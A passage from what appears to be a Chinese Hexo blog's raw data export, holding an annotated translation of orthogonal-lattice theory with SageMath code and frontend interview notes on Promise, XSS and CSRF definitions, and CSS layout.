$E^\\bot$ 的写法较为广泛。</p>\n</blockquote>\n<p>在 $\\mathbf{Z}^n$ 的正则基上解析每个 $\\mathbf{b}_j$ 如下：</p>\n<p>$$<br>\\mathbf{b}_j =<br>\\begin{pmatrix}<br>b_{1,j} \\\\<br>b_{2,j} \\\\<br>\\vdots \\\\<br>b_{n,j}<br>\\end{pmatrix}<br>$$<br>（这里吐槽一下，由于下划线和 Markdown 语法有冲突，如果不加反斜杠， $b_j$ 写成 $\\mathbf{b}_j$ Latex 就会炸，下文一开始也炸了几回，弄了几次才发现是这问题）</p>\n<p>定义整数 $n\\times d$ 的整数矩阵 $B=(b_{i,j})_{1\\leq i\\leq n,1\\leq j\\leq d}$ ，格 $\\mathit{\\Lambda}$ 由 $B$ 的列向量张成，我们称 $\\mathit{\\Lambda}$ 由 $B$ 张成。令 $Q={^tB}B$ 为 $d\\times d$ 的对称 Gram 矩阵。 $Q$ 的行列式是与 $\\mathcal{B}$ 无关的正整数。 $\\mathit{\\Lambda}$ 的行列式被定义为 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(B)}$ 。</p>\n<blockquote>\n<p>笔者注记：<br>这是的 ${^tB}$ 应该是 $B^T$ 的意思，又是奇怪的写法（）<br>至于 Gram 矩阵，中文音译为格拉姆矩阵，对 $n$ 维欧氏空间上的 $k$ 个向量，其 Gram 矩阵为<br>$$<br>\\triangle(\\mathbf{v}_1,\\dots,\\mathbf{v}_k) =<br>\\begin{pmatrix}<br>\\langle\\mathbf{v}_1,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_1,\\mathbf{v}_k\\rangle \\\\<br>\\vdots &amp; \\ddots &amp; \\vdots \\\\<br>\\langle\\mathbf{v}_k,\\mathbf{v}_1\\rangle &amp; \\cdots &amp; \\langle\\mathbf{v}_k,\\mathbf{v}_k\\rangle<br>\\end{pmatrix}<br>$$<br>不难看出这个可以等价表示为 $V^T\\times V$ ，得出的矩阵也显然是对称的。<br>这里 $\\mathit{\\Lambda}$ 不是一个方阵，故不能直接求出其行列式，那么就应该通过其 Gram 矩阵来求行列式，这里我觉得应该是 $\\det(\\mathit{\\Lambda})=\\sqrt{\\det(Q)}$ ，但我不确定。</p>\n</blockquote>\n<p><strong>定理1</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的完备格，那么 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。<br>证明：我们有 $\\mathit{\\Lambda}=E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n$ 和 $\\mathit{\\Lambda}^-=E_{\\mathit{\\Lambda}}^-\\cap\\mathbf{Z}^n$ 。从另一篇论文（我也没读过）我们知道：<br>$$<br>\\det(\\mathbf{Z}^n)=\\frac{\\det(E_{\\mathit{\\Lambda}}\\cap\\mathbf{Z}^n)}{\\det((E_{\\mathit{\\Lambda}}^-)\\cap(\\mathbf{Z}^n)^*)}<br>$$<br>其中 $(\\mathbf{Z}^n)^*$ 表示 $\\mathbf{Z}^n$ 上的极格。但 $\\det(\\mathbf{Z}^n)=1$ （？为什么要说但呢？）且 $(\\mathbf{Z}^n)^*=\\mathbf{Z}^n$ ，故 $\\det(\\mathit{\\Lambda}^-)=\\det(\\mathit{\\Lambda})$ 。</p>\n<p><strong>推论2</strong> 令 $\\mathit{\\Lambda}$ 为 $\\mathbf{Z}^n$ 上的格，那么 $\\det((\\mathit{\\Lambda}^-)^-)=\\det(\\mathit{\\Lambda}^-)=\\det(\\overline{\\mathit{\\Lambda}})$ 。</p>\n<p><strong>定理3</strong> 令 $(\\mathbf{b}_1,…,\\mathbf{b}_d)$为格$\\mathit{\\Lambda}$ 在 $\\mathbf{Z}^n$ 上的一组 LLL 约化基，那么：</p>\n<ol>\n<li>$\\det(\\mathit{\\Lambda})\\leq \\prod^d_{i=1}||\\mathbf{b}_i||\\leq 2^{d(d-1)/4}\\det(\\mathit{\\Lambda})$</li>\n<li>对任意线性无关的向量 $\\mathbf{x}_1,…,\\mathbf{x}_t\\in\\mathit{\\Lambda}$ ，当 $1\\leq j \\leq t$ 时，有：<br>$$<br>||\\mathbf{b}_j||\\leq 2^{(d-1)/2}\\max(||\\mathbf{x}_1||,…,||\\mathbf{x}_t||)<br>$$</li>\n</ol>\n<p>我们现在描述计算正交格的一组 LLL 约化基的基本方法。令 $\\mathcal{B}=(\\mathbf{b}_1,…,\\mathbf{b}_d)$ 为 $\\mathit{\\Lambda}$ 的一组基， $B=(b_{i,j})$ 为其对应的 $n\\times d$ 的矩阵。令 $c$ 为一个正整数常量。定义 $\\mathit{\\Omega}$为$\\mathbf{Z}^{n+d}$ 上由以下 $(n+d)\\times n$ 矩阵张成的格。</p>\n<p>$$<br>B^-=<br>\\begin{pmatrix}<br>c\\times b_{1,1} &amp; c\\times b_{2,1} &amp; \\cdots &amp; c\\times b_{n,1} \\\\<br>c\\times b_{1,2} &amp; c\\times b_{2,2} &amp; \\cdots &amp; c\\times b_{n,2} \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>c\\times b_{1,d} &amp; c\\times b_{2,d} &amp; \\cdots &amp; c\\times b_{n,d} \\\\<br>1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1<br>\\end{pmatrix}<br>$$<br>矩阵 $B^-$ 被分成两块：上面 $d\\times n$ 部分是 $c\\ {^tB}$ ，下面 $n\\times n$ 部分是单位阵。<br>设 $p_{\\uparrow}$ 和 $p_{\\downarrow}$ 是两个投影，将 $\\mathbf{Z}^{n+d}$ 的任何向量分别映射到由其前 $d$ 个坐标构成的 $\\mathbf{Z}^d$ 向量和由其最后 $n$ 个坐标构成的 $\\mathbf{Z}^n$ 向量，所有投影都与正则基有关。<del>（这段翻译累死我了）</del><br>令 $\\mathbf{x}$ 为 $\\mathit{\\Omega}$ 的一个向量并记 $\\mathbf{y}=p_{\\downarrow}(\\mathbf{x})$ ，那么</p>\n<p>$$<br>p_{\\uparrow}(\\mathbf{y})=<br>\\begin{pmatrix}<br>\\mathbf{y}.\\mathbf{b}_1 \\\\<br>\\vdots \\\\<br>\\mathbf{y}.\\mathbf{b}_d<br>\\end{pmatrix}<br>$$<br>因此，当且仅当 $p_{\\uparrow}(\\mathbf{x})=0$ 时有 $\\mathbf{y}\\in \\mathit{\\Lambda}^-$ 。此外，如果 $||\\mathbf{x}||\\leq c$ ，那么 $p_{\\uparrow}(\\mathbf{x})=0$ 。</p>\n<p><strong>定理4</strong> 令 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$ 为格 $\\mathit{\\Omega}$ 的一组 LLL 约化基。若</p>\n<p>$$<br>c&gt;2^{(n-1)/2+(n-d)(n-d-1)/4}\\det(\\overline{\\mathit{\\Lambda}})<br>$$<br>则 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$ 为 $\\overline{\\mathit{\\Lambda}}$ 的一组 LLL 约化基。</p>\n<p>使用阿达马不等式，我们得到以下算法：</p>\n<p><strong>算法5</strong> 给定一组 $\\mathbf{Z}^n$ 上格 $\\mathit{\\Lambda}$ 的基 $(\\mathbf{b}_1,\\mathbf{b}_2,…,\\mathbf{b}_d)$ ，该算法计算一组 $\\overline{\\mathit{\\Lambda}}$ 的LLL约化基。</p>\n<ol>\n<li><p>选取 $c=\\lceil2^{(n-1)/2+(n-d)(n-d-1)/4}\\prod^d_{j=1}||\\mathbf{b}_j||\\rceil$</p>\n</li>\n<li><p>计算 $(n+d)\\times n$ 的整数矩阵 $B^-$ 和 $\\mathbf{b}_1,…,\\mathbf{b}_d$ 对应的 $n\\times d$ 矩阵 $B=(b_{i,j})$</p>\n</li>\n<li><p>计算由 $B^-$ 张成的格的一组 LLL 约化基 $(\\mathbf{x}_1,\\mathbf{x}_2,…,\\mathbf{x}_n)$</p>\n</li>\n<li><p>输出 $(p_{\\downarrow}(\\mathbf{x}_1),p_{\\downarrow}(\\mathbf{x}_2),…,p_{\\downarrow}(\\mathbf{x}_{n-d}))$</p>\n</li>\n</ol>\n<p>可以证明，这是一个关于空间维数 $n$ 、格维数 $d$ 和 $||\\mathbf{b}_j||$ 比特长度的任何上界的确定性多项式时间算法。在实践中，不需要选择这样大的常数 $c$ ，因为 LLL 算法的理论界非常悲观。（翻译了这么久都看不懂，我也很悲观.jpg）</p>\n<blockquote>\n<p>笔者注记：<br>$\\lceil$和$\\rceil$表示向上取整，例如$\\lceil 1.2 \\rceil = 2$。</p>\n</blockquote>\n<h4 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>之前看过 Herry 师傅从 dbt 那抄的一个求法是用左零空间求解，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    LB = B.transpose().left_kernel(basis=<span class=\"string\">&quot;LLL&quot;</span>).basis_matrix()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<p>但笔者发现这样似乎只能在低维下求解，高维情况下时间会爆炸（至少试过一夜都没跑出来）<br>于是照着 paper 搓了一个 implemention ，快了很多，三分钟左右就能求解 $255\\times512$ 矩阵的正交格，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">orthogonal_lattice</span>(<span class=\"params\">B</span>):</span><br><span class=\"line\">    _d, _n = B.nrows(), B.ncols()</span><br><span class=\"line\">    _c = <span class=\"number\">2</span> ** <span class=\"built_in\">min</span>(((_n-<span class=\"number\">1</span>)/<span class=\"number\">2</span>+(_n-_d)*(_n-_d-<span class=\"number\">1</span>)/<span class=\"number\">4</span>),<span class=\"number\">20</span>)    <span class=\"comment\"># this bound can be adjusted as needed</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> B:</span><br><span class=\"line\">        _c *= b.norm()</span><br><span class=\"line\">    B_bot = (ceil(_c)*B).stack(identity_matrix(ZZ, _n))</span><br><span class=\"line\">    B_r = B_bot.transpose().LLL()</span><br><span class=\"line\">    LB = B_r.matrix_from_rows_and_columns(<span class=\"built_in\">range</span>(_n-_d), <span class=\"built_in\">range</span>(_d,_n+_d))</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> (B*LB.transpose()).is_zero()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LB</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://link.springer.com/chapter/10.1007/BFb0052236\">P. Q. Nguyen and J. Stern. Merkle-Hellman revisited: A cryptoanalysis of the Qu-Vanstone cryptosystem based on group factorizations. In B. S. Kaliski Jr., editor, CRYPTO, volume 1294 of Lecture Notes in Computer Science, pages 198–212. Springer, 1997.</a></p>\n</li>\n<li><p><a href=\"https://link.springer.com/article/10.1007/s13389-011-0015-x\">Modulus Fault Attacks Against RSA-CRT Signatures</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/50483906\">知乎 线性代数之——正交向量与子空间</a></p>\n</li>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/187345192\">知乎 格拉姆矩阵（Gram matrix）详细解读</a></p>\n</li>\n</ul>"},{"title":"Matrix 面试 - Summary","date":"2022-04-03T13:48:00.000Z","_content":"\n吃一堑，长一智。\n<!--more-->\n\n第一次正经面试，虽然简历已经填得很谨慎，但是面试官还是没有放过我，从铜锣湾问到上海滩，而我：不清楚，没了解过，没听说过，忘了，不会。（安详）\n\n痛定思痛，在按照学长的指引看书的同时，我也对提的问题作了总结，主要分为三个部分：**算法、计算机网络、前端**。\n\n算法问了**动态规划**，计算机网络问了**路由转发**、**https**、**DNS** 和 **CDN**，这俩内容较少，并作一篇和其他杂项一起总结。\n前端问了 **Promise**、**xss 注入**、**csrf 攻击**、**原生 JS 数据绑定和反射**、**CSS 盒模型**以及**行内元素和块级元素**。\n\n内容有点多，不定期更新（逃\n","source":"_posts/Matrix 面试 - Summary.md","raw":"---\ntitle: Matrix 面试 - Summary\ndate: 2022-04-03 21:48:00\ntags: [前端,算法,计算机网络]\ncategories: 学习\n---\n\n吃一堑，长一智。\n<!--more-->\n\n第一次正经面试，虽然简历已经填得很谨慎，但是面试官还是没有放过我，从铜锣湾问到上海滩，而我：不清楚，没了解过，没听说过，忘了，不会。（安详）\n\n痛定思痛，在按照学长的指引看书的同时，我也对提的问题作了总结，主要分为三个部分：**算法、计算机网络、前端**。\n\n算法问了**动态规划**，计算机网络问了**路由转发**、**https**、**DNS** 和 **CDN**，这俩内容较少，并作一篇和其他杂项一起总结。\n前端问了 **Promise**、**xss 注入**、**csrf 攻击**、**原生 JS 数据绑定和反射**、**CSS 盒模型**以及**行内元素和块级元素**。\n\n内容有点多，不定期更新（逃\n","slug":"Matrix 面试 - Summary","published":1,"updated":"2022-11-27T11:17:56.166Z","_id":"clazajjqy0005yo6gahdt3fqu","comments":1,"layout":"post","photos":[],"content":"<p>吃一堑，长一智。</p>\n<span id=\"more\"></span>\n\n<p>第一次正经面试，虽然简历已经填得很谨慎，但是面试官还是没有放过我，从铜锣湾问到上海滩，而我：不清楚，没了解过，没听说过，忘了，不会。（安详）</p>\n<p>痛定思痛，在按照学长的指引看书的同时，我也对提的问题作了总结，主要分为三个部分：<strong>算法、计算机网络、前端</strong>。</p>\n<p>算法问了<strong>动态规划</strong>，计算机网络问了<strong>路由转发</strong>、<strong>https</strong>、<strong>DNS</strong> 和 <strong>CDN</strong>，这俩内容较少，并作一篇和其他杂项一起总结。<br>前端问了 <strong>Promise</strong>、<strong>xss 注入</strong>、<strong>csrf 攻击</strong>、<strong>原生 JS 数据绑定和反射</strong>、<strong>CSS 盒模型</strong>以及<strong>行内元素和块级元素</strong>。</p>\n<p>内容有点多，不定期更新（逃</p>\n","excerpt":"<p>吃一堑，长一智。</p>","more":"<p>第一次正经面试，虽然简历已经填得很谨慎，但是面试官还是没有放过我，从铜锣湾问到上海滩，而我：不清楚，没了解过，没听说过，忘了，不会。（安详）</p>\n<p>痛定思痛，在按照学长的指引看书的同时，我也对提的问题作了总结，主要分为三个部分：<strong>算法、计算机网络、前端</strong>。</p>\n<p>算法问了<strong>动态规划</strong>，计算机网络问了<strong>路由转发</strong>、<strong>https</strong>、<strong>DNS</strong> 和 <strong>CDN</strong>，这俩内容较少，并作一篇和其他杂项一起总结。<br>前端问了 <strong>Promise</strong>、<strong>xss 注入</strong>、<strong>csrf 攻击</strong>、<strong>原生 JS 数据绑定和反射</strong>、<strong>CSS 盒模型</strong>以及<strong>行内元素和块级元素</strong>。</p>\n<p>内容有点多，不定期更新（逃</p>"},{"title":"Matrix 面试 - 前端篇","date":"2022-04-03T14:42:00.000Z","_content":"\n持续懵逼\n<!--more-->\n\n## Promise\n\n> 所有为你而行的空幻梦想，都不及最后与你许的愿望。——《梦回还》\n\n### 异步编程\n\nJS有个很重要的部分叫异步编程，那么所以谓异步，大概可以通过这样一个例子说明：\n\n一个网页，有文字，有图片，假定按照同步的方式来加载，那么就要等图片下载完了再加载内容，而如此一来，用户看到的就是一个空白了很久的网页突然弹出一堆东西，关键不在突然弹出，而在出现内容前的空白时间，**用户一不耐烦给你关了**，再花的网页都无用了（）。\n那么就有一个解决方法，先把文字渲染上去，然后等图片传输完成再渲染图片，这样就有一种 99% 的感觉，用户就没那么容易跑了。这就是异步的思想。\n\n### 回调\n\n回调是一种早期的异步编程方式，但是由于其嵌套造成的“回调地狱”，现在基本已经不再使用，就不再赘述了。\n\n### 期约\n\n一个简单的 Promise 实例：\n\n```js\nlet p=new Promise((resolve, reject) =>{\n    setTimeout(()=>{\n        resolve('2');\n    },2000);\n})\nconsole.log('1');\np.then((data)=>{\n    console.log(data);\n})\n```\n\n这段代码中定义了一个 **Promise 对象** p，这个对象中的 setTimeout 会在 2 秒后调用 resolve 方法，resolve 方法一调用， `p.then` 就会执行，data 接的是 resolve() 传入的参数，这里是 '2' 。\n\n### async/await\n\n待更新...\n\n## xss注入\n\nXSS ,也就是 Cross-Site Scripting 的缩写，意为**跨站脚本**。具体来说就是把恶意代码注入到网页中，用户一打开网页，恶意代码就执行了。常见的 XSS 漏洞类型有如下几种：\n\n1. 反射/存储型 XSS\n2. DOM 操作型 XSS\n\n### 反射/存储型 XSS\n\n反射型XSS通常是指恶意代码未被服务器存储，每次触发漏洞的时候都将恶意代码通过 GET/POST 方式提交，然后触发漏洞。\n\n## csrf 攻击\n\n最近打 CTF 见着一个叫 **ssrf** 攻击的，这俩长挺像，就想着是不是一个 Client 一个 Server ，再一搜，发现还真。。。不是。\ncsrf 全称 Cross-site request forgery ，意为**跨站请求伪造**，而 ssrf 全称 Server-side request forgery ，意为**服务器端请求伪造**。\n\n## 原生 JS 数据绑定和反射\n\n待更新...\n\n## CSS 盒模型\n\n看吧，就是像个盒子（逃\n![盒子图](https://www.runoob.com/images/box-model.gif)\n（图源菜鸟教程）\nMargin 指**外边距**，Border 指**边框**，Padding 指**内边距**，Content 指**内容**。\n然后没啥好解释了，实际上就是反复调整这几个部分的宽高，而且功夫不到家（像我这样）很容易被坑到，因为两个盒子之间可能会存在重叠。\n\n## 行内元素和块级元素\n\n表面上说比较突出的特点就是**块级元素单独占一行或者几行**，而**行内元素不占独立区域**。\n\n### 块级元素\n\n块级元素一般有下面几种：\n\n```html\n<h1>~<h6>\n<p>\n<div>\n<ul>\n<ol>\n<li>\n```\n\n块级元素的宽度默认是容器的 100% ，也就是说它的宽度和父元素的宽度一样。\n里面也可以塞进行内元素和其他块级元素。\n\n### 行内元素\n\n行内元素又名内联元素，一般有下面几种：\n\n```html\n<a>\n<span>\n<b>\n<i>\n<em>\n<strong>\n<small>\n<del>\n```\n\n行内元素和相邻行内元素是在同一行上的，而且有个关键的特点——它是不能调宽高的，默认宽高就是内容的宽高。\n但也不是完全定死，水平方向的 padding 和 margin 就是可调的。\n行内元素里面只能放纯文本或者其他行内元素，而不能放块级元素。\n\n### 行内块级元素\n\n有这个玩意也是我始料未及的\n所谓行内块级元素，本质也是行内元素，但不同的是它具有块级元素可调高度的特性，而且和相邻的行内元素在同一行的时候，中间会有空白间隙。\n行内块级元素一般有下面几种：\n\n```html\n<img/>\n<input/>\n<td/>\n```\n\n********************************\n\n持续更新中...\n\n## 参考\n\n* 《JavaScript高级程序设计》（第4版）——Matt Frisbie[著]李松峰[译]\n* 《从0到1：CTFer成长之路》——Nu1L战队[著]\n* <https://blog.csdn.net/qingyafan/article/details/52203663>\n* <https://www.runoob.com/css/css-boxmodel.html>\n<https://blog.csdn.net/qq_34821198/article/details/91359274>\n","source":"_posts/Matrix 面试 - 前端篇.md","raw":"---\ntitle: Matrix 面试 - 前端篇\ndate: 2022-04-03 22:42:00\ntags: [前端]\ncategories: 学习\n---\n\n持续懵逼\n<!--more-->\n\n## Promise\n\n> 所有为你而行的空幻梦想，都不及最后与你许的愿望。——《梦回还》\n\n### 异步编程\n\nJS有个很重要的部分叫异步编程，那么所以谓异步，大概可以通过这样一个例子说明：\n\n一个网页，有文字，有图片，假定按照同步的方式来加载，那么就要等图片下载完了再加载内容，而如此一来，用户看到的就是一个空白了很久的网页突然弹出一堆东西，关键不在突然弹出，而在出现内容前的空白时间，**用户一不耐烦给你关了**，再花的网页都无用了（）。\n那么就有一个解决方法，先把文字渲染上去，然后等图片传输完成再渲染图片，这样就有一种 99% 的感觉，用户就没那么容易跑了。这就是异步的思想。\n\n### 回调\n\n回调是一种早期的异步编程方式，但是由于其嵌套造成的“回调地狱”，现在基本已经不再使用，就不再赘述了。\n\n### 期约\n\n一个简单的 Promise 实例：\n\n```js\nlet p=new Promise((resolve, reject) =>{\n    setTimeout(()=>{\n        resolve('2');\n    },2000);\n})\nconsole.log('1');\np.then((data)=>{\n    console.log(data);\n})\n```\n\n这段代码中定义了一个 **Promise 对象** p，这个对象中的 setTimeout 会在 2 秒后调用 resolve 方法，resolve 方法一调用， `p.then` 就会执行，data 接的是 resolve() 传入的参数，这里是 '2' 。\n\n### async/await\n\n待更新...\n\n## xss注入\n\nXSS ,也就是 Cross-Site Scripting 的缩写，意为**跨站脚本**。具体来说就是把恶意代码注入到网页中，用户一打开网页，恶意代码就执行了。常见的 XSS 漏洞类型有如下几种：\n\n1. 反射/存储型 XSS\n2. DOM 操作型 XSS\n\n### 反射/存储型 XSS\n\n反射型XSS通常是指恶意代码未被服务器存储，每次触发漏洞的时候都将恶意代码通过 GET/POST 方式提交，然后触发漏洞。\n\n## csrf 攻击\n\n最近打 CTF 见着一个叫 **ssrf** 攻击的，这俩长挺像，就想着是不是一个 Client 一个 Server ，再一搜，发现还真。。。不是。\ncsrf 全称 Cross-site request forgery ，意为**跨站请求伪造**，而 ssrf 全称 Server-side request forgery ，意为**服务器端请求伪造**。\n\n## 原生 JS 数据绑定和反射\n\n待更新...\n\n## CSS 盒模型\n\n看吧，就是像个盒子（逃\n![盒子图](https://www.runoob.com/images/box-model.gif)\n（图源菜鸟教程）\nMargin 指**外边距**，Border 指**边框**，Padding 指**内边距**，Content 指**内容**。\n然后没啥好解释了，实际上就是反复调整这几个部分的宽高，而且功夫不到家（像我这样）很容易被坑到，因为两个盒子之间可能会存在重叠。\n\n## 行内元素和块级元素\n\n表面上说比较突出的特点就是**块级元素单独占一行或者几行**，而**行内元素不占独立区域**。\n\n### 块级元素\n\n块级元素一般有下面几种：\n\n```html\n<h1>~<h6>\n<p>\n<div>\n<ul>\n<ol>\n<li>\n```\n\n块级元素的宽度默认是容器的 100% ，也就是说它的宽度和父元素的宽度一样。\n里面也可以塞进行内元素和其他块级元素。\n\n### 行内元素\n\n行内元素又名内联元素，一般有下面几种：\n\n```html\n<a>\n<span>\n<b>\n<i>\n<em>\n<strong>\n<small>\n<del>\n```\n\n行内元素和相邻行内元素是在同一行上的，而且有个关键的特点——它是不能调宽高的，默认宽高就是内容的宽高。\n但也不是完全定死，水平方向的 padding 和 margin 就是可调的。\n行内元素里面只能放纯文本或者其他行内元素，而不能放块级元素。\n\n### 行内块级元素\n\n有这个玩意也是我始料未及的\n所谓行内块级元素，本质也是行内元素，但不同的是它具有块级元素可调高度的特性，而且和相邻的行内元素在同一行的时候，中间会有空白间隙。\n行内块级元素一般有下面几种：\n\n```html\n<img/>\n<input/>\n<td/>\n```\n\n********************************\n\n持续更新中...\n\n## 参考\n\n* 《JavaScript高级程序设计》（第4版）——Matt Frisbie[著]李松峰[译]\n* 《从0到1：CTFer成长之路》——Nu1L战队[著]\n* <https://blog.csdn.net/qingyafan/article/details/52203663>\n* <https://www.runoob.com/css/css-boxmodel.html>\n<https://blog.csdn.net/qq_34821198/article/details/91359274>\n","slug":"Matrix 面试 - 前端篇","published":1,"updated":"2023-11-04T18:29:00.268Z","_id":"clazajjqz0008yo6g4kd73ymc","comments":1,"layout":"post","photos":[],"content":"<p>持续懵逼</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h2><blockquote>\n<p>所有为你而行的空幻梦想，都不及最后与你许的愿望。——《梦回还》</p>\n</blockquote>\n<h3 id=\"异步编程\"><a href=\"#异步编程\" class=\"headerlink\" title=\"异步编程\"></a>异步编程</h3><p>JS有个很重要的部分叫异步编程，那么所以谓异步，大概可以通过这样一个例子说明：</p>\n<p>一个网页，有文字，有图片，假定按照同步的方式来加载，那么就要等图片下载完了再加载内容，而如此一来，用户看到的就是一个空白了很久的网页突然弹出一堆东西，关键不在突然弹出，而在出现内容前的空白时间，<strong>用户一不耐烦给你关了</strong>，再花的网页都无用了（）。<br>那么就有一个解决方法，先把文字渲染上去，然后等图片传输完成再渲染图片，这样就有一种 99% 的感觉，用户就没那么容易跑了。这就是异步的思想。</p>\n<h3 id=\"回调\"><a href=\"#回调\" class=\"headerlink\" title=\"回调\"></a>回调</h3><p>回调是一种早期的异步编程方式，但是由于其嵌套造成的“回调地狱”，现在基本已经不再使用，就不再赘述了。</p>\n<h3 id=\"期约\"><a href=\"#期约\" class=\"headerlink\" title=\"期约\"></a>期约</h3><p>一个简单的 Promise 实例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> p=<span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">()=&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_\">resolve</span>(<span class=\"string\">&#x27;2&#x27;</span>);</span><br><span class=\"line\">    &#125;,<span class=\"number\">2000</span>);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;1&#x27;</span>);</span><br><span class=\"line\">p.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">data</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(data);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>这段代码中定义了一个 <strong>Promise 对象</strong> p，这个对象中的 setTimeout 会在 2 秒后调用 resolve 方法，resolve 方法一调用， <code>p.then</code> 就会执行，data 接的是 resolve() 传入的参数，这里是 ‘2’ 。</p>\n<h3 id=\"async-await\"><a href=\"#async-await\" class=\"headerlink\" title=\"async/await\"></a>async/await</h3><p>待更新…</p>\n<h2 id=\"xss注入\"><a href=\"#xss注入\" class=\"headerlink\" title=\"xss注入\"></a>xss注入</h2><p>XSS ,也就是 Cross-Site Scripting 的缩写，意为<strong>跨站脚本</strong>。具体来说就是把恶意代码注入到网页中，用户一打开网页，恶意代码就执行了。常见的 XSS 漏洞类型有如下几种：</p>\n<ol>\n<li>反射/存储型 XSS</li>\n<li>DOM 操作型 XSS</li>\n</ol>\n<h3 id=\"反射-存储型-XSS\"><a href=\"#反射-存储型-XSS\" class=\"headerlink\" title=\"反射/存储型 XSS\"></a>反射/存储型 XSS</h3><p>反射型XSS通常是指恶意代码未被服务器存储，每次触发漏洞的时候都将恶意代码通过 GET/POST 方式提交，然后触发漏洞。</p>\n<h2 id=\"csrf-攻击\"><a href=\"#csrf-攻击\" class=\"headerlink\" title=\"csrf 攻击\"></a>csrf 攻击</h2><p>最近打 CTF 见着一个叫 <strong>ssrf</strong> 攻击的，这俩长挺像，就想着是不是一个 Client 一个 Server ，再一搜，发现还真。。。不是。<br>csrf 全称 Cross-site request forgery ，意为<strong>跨站请求伪造</strong>，而 ssrf 全称 Server-side request forgery ，意为<strong>服务器端请求伪造</strong>。</p>\n<h2 id=\"原生-JS-数据绑定和反射\"><a href=\"#原生-JS-数据绑定和反射\" class=\"headerlink\" title=\"原生 JS 数据绑定和反射\"></a>原生 JS 数据绑定和反射</h2><p>待更新…</p>\n<h2 id=\"CSS-盒模型\"><a href=\"#CSS-盒模型\" class=\"headerlink\" title=\"CSS 盒模型\"></a>CSS 盒模型</h2><p>看吧，就是像个盒子（逃<br><img src=\"https://www.runoob.com/images/box-model.gif\" alt=\"盒子图\"><br>（图源菜鸟教程）<br>Margin 指<strong>外边距</strong>，Border 指<strong>边框</strong>，Padding 指<strong>内边距</strong>，Content 指<strong>内容</strong>。<br>然后没啥好解释了，实际上就是反复调整这几个部分的宽高，而且功夫不到家（像我这样）很容易被坑到，因为两个盒子之间可能会存在重叠。</p>\n<h2 id=\"行内元素和块级元素\"><a href=\"#行内元素和块级元素\" class=\"headerlink\" title=\"行内元素和块级元素\"></a>行内元素和块级元素</h2><p>表面上说比较突出的特点就是<strong>块级元素单独占一行或者几行</strong>，而<strong>行内元素不占独立区域</strong>。</p>\n<h3 id=\"块级元素\"><a href=\"#块级元素\" class=\"headerlink\" title=\"块级元素\"></a>块级元素</h3><p>块级元素一般有下面几种：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>~<span class=\"tag\">&lt;<span class=\"name\">h6</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span 